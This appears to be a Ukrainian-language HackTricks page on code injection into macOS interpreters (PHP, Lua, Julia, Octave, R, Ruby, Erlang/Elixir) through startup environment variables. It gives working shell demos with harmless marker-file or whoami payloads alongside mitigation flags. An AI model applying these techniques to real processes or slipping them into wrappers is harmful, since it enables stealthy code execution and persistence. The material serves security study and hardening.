# Ін’єкція під час запуску інтерпретаторів macOS через змінні середовища

{{#include ../../../banners/hacktricks-training.md}}

Ці runtime-специфічні техніки використовують успадковані змінні середовища для вибору конфігурації запуску, попереднього завантаження коду або передавання прапорців VM до запуску цільового процесу. Деякі варіанти використовують файли; Lua та Erlang також підтримують виконання вбудованого коду.

## Конфігурація запуску PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` і `auto_prepend_file`

PHP CLI і CGI читають конфігурацію під час кожного запуску. `PHPRC` може вказати на доступний зловмиснику файл `php.ini`, а `PHP_INI_SCAN_DIR` може перенаправити каталог, у якому шукаються додаткові файли `.ini`. Директива `auto_prepend_file` змушує PHP розібрати файл перед запитаним скриптом, тож така комбінація дає змогу виконати код під час запуску.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Альтернативою є каталог, що містить файл `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Параметр `-n` ігнорує `php.ini`; явний довірений шлях `-c` має пріоритет над `PHPRC`. Пам’ятайте, що довготривалий серверний SAPI зазвичай читає конфігурацію під час запуску вебсервера, тоді як CLI і CGI роблять це під час кожного виклику.<sup>[[1]](#references)</sup>

## Код запуску Lua

### `LUA_INIT`

Перш ніж обробляти параметри командного рядка або цільовий скрипт, автономний інтерпретатор Lua виконує `LUA_INIT_<major>_<minor>` або, якщо змінна з версією відсутня, `LUA_INIT`. Значення, що починається з `@`, задає файл; будь-яке інше значення безпосередньо виконується як код Lua. Це дає змогу виконувати код під час запуску як із файлу, так і без нього.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Точна назва з версією змінюється залежно від інтерпретатора, наприклад `LUA_INIT_5_4`. `lua -E` ігнорує всі змінні середовища, зокрема код запуску та шляхи до модулів Lua.

## Депо запуску Julia

### `JULIA_DEPOT_PATH` і `startup.jl`

Зазвичай під час запуску Julia виконує `config/startup.jl` із першого депо. `JULIA_DEPOT_PATH` визначає список депо, тож якщо вказати дерево, доступне для читання зловмиснику, це перенаправить автоматично завантажуваний файл запуску.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Кінцевий роздільник корисний, якщо жертві все ще потрібні звичайні пакунки. `julia --startup-file=no` вимикає цей startup file. Очистьте змінну перед запуском, оскільки вона також визначає реєстри пакунків, середовища, кеші та розташування для завантаження коду.

## Файли запуску GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

Під час запуску GNU Octave виконує кілька файлів, що містять коректні команди Octave. `OCTAVE_SITE_INITFILE` перевизначає загальносистемний файл запуску, а `OCTAVE_VERSION_INITFILE` — файл запуску для конкретної версії, тож кожна зі змінних дає змогу перенаправити автоматичне виконання на файл, доступний для читання зловмиснику.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` пропускає лише файли користувача, як-от `~/.octaverc`; це **не** зупиняє наведене вище перевизначення системного файлу. Для системних файлів використовуйте `--no-site-file`, а щоб вимкнути всі файли запуску — `--norc` / `-f`.<sup>[[7]](#references)</sup>

## Профілі запуску R і завантаження пакетів

### `R_PROFILE_USER` / `R_PROFILE`

Під час запуску R завантажує системні й користувацькі файли профілів, що містять код R. `R_PROFILE` задає системний профіль, а `R_PROFILE_USER` — користувацький, що дає змогу успадкованому середовищу спрямувати будь-який із цих пошуків до файлу, доступного зловмиснику для читання.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` пропускає профіль користувача, `--no-site-file` пропускає профіль сайту, а `--vanilla` забезпечує обидва захисти. Спочатку R обробляє файли середовища, вибрані через `R_ENVIRON` і `R_ENVIRON_USER`, але ці файли лише задають змінні; змінні профілю є безпосереднім механізмом виконання довільного коду.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` і шляхи до бібліотек

Під час запуску R під'єднує пакети зі списку, розділеного комами, у `R_DEFAULT_PACKAGES`. `Rscript` надає пріоритет `R_SCRIPT_DEFAULT_PACKAGES`. Поєднання будь-якої з цих змінних із `R_LIBS`, `R_LIBS_USER` або `R_LIBS_SITE` може змусити R знайти й завантажити встановлений пакет, контрольований зловмисником; його хук `.onLoad` або `.onAttach` виконується автоматично.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Для цього потрібен структурно коректний встановлений R-пакет, а не просто окремий файл `.R`. Параметр `--vanilla` не очищає безпосередньо успадковані змінні, тому довірена обгортка має скасувати або замінити змінні default-package і library-path, а також вимкнути файли профілю.

## Параметри завантажувача Ruby

### RUBYOPT

Перш ніж запускати скрипт, Ruby зчитує підтримувані параметри командного рядка зі змінної середовища `RUBYOPT`. Ruby забороняє виконувати код через `-e` у `RUBYOPT`, але `-I` може додати каталог на початок шляху пошуку бібліотек, а `-r` — завантажити бібліотеку. Тож процес, який запускає Ruby зі змінними середовища, контрольованими зловмисником, можна змусити завантажити Ruby-код зловмисника.<sup>[[10]](#references)</sup>

Створіть `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Створіть нешкідливий Ruby-скрипт, наприклад `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Запустіть його з контрольованим значенням `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Щоб вимкнути цю поведінку, перед назвою скрипту передайте `--disable=rubyopt` (або `--disable-rubyopt`):<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Параметр, указаний після `hello.rb`, передається скрипту в `ARGV`; він не вимикає попередню обробку Ruby змінної `RUBYOPT`.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Замість додавання каталогу завантаження на початок списку за допомогою `-I` у `RUBYOPT`, окрема змінна середовища `RUBYLIB` додає каталоги до Ruby `$LOAD_PATH`. У поєднанні з `RUBYOPT=-r<module>` вона завантажує код зловмисника без потреби в `-I` у `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Прапорці VM Erlang та Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` та `ERL_ZFLAGS`

Програма запуску `erl` додає `ERL_AFLAGS` на початок командного рядка, а `ERL_FLAGS` / `ERL_ZFLAGS` — у кінець. Оскільки `-eval` обчислює вираз Erlang під час ініціалізації VM, ці змінні можуть забезпечити безфайлове виконання коду до запуску запланованого робочого навантаження.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix і багато релізів Elixir зрештою запускають Erlang VM і можуть успадкувати ці прапорці. Перевірте точний wrapper релізу: він може повторно формувати або очищати аргументи VM, тоді як деякі інструменти явно підтримують `ERL_AFLAGS`, `ERL_ZFLAGS` або `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

На відміну від більшості методів, що використовують файли, для payload `-eval` не потрібен файл, контрольований атакувальником. Довірений wrapper має очищати всі три змінні прапорців Erlang (а для Elixir — також `ELIXIR_ERL_OPTIONS`) перед запуском runtime; не намагайтеся дозволяти окремі прапорці VM за списком, якщо ви повністю не розумієте парсер і порядок їх обробки.

## References

- [1] [Файл конфігурації PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Автономний інтерпретатор Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Інтерфейс командного рядка Julia: файл запуску](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Змінні середовища Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Файли запуску GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Параметри командного рядка GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Ініціалізація під час запуску сеансу R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Встановлення та адміністрування R: додаткові пакети](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Документація Ruby — параметри командного рядка Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Команда `erl` і змінні середовища](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Релізи Elixir і параметри середовища VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
